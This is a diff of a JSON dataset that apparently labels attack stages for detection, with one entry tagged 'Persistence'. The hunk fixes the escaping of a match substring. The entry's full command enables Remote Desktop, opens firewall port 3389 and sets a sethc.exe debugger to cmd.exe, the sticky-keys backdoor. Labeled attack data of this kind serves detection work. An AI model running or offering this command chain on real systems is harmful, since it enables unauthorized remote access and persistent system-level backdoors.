@@ -33,7 +33,7 @@
     {
       "id": "A4",
       "stage": "Persistence",
-      "match_substring": "Execution Options\\\\sethc.exe",
+      "match_substring": "Execution Options\\sethc.exe",
       "full_command": "reg add \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\";REG ADD \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\\\windows\\\\system32\\\\cmd.exe\" /f ; REG query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\"",
       "file_path": null,
       "occurTime_start": "2022-03-18 16:46:59",
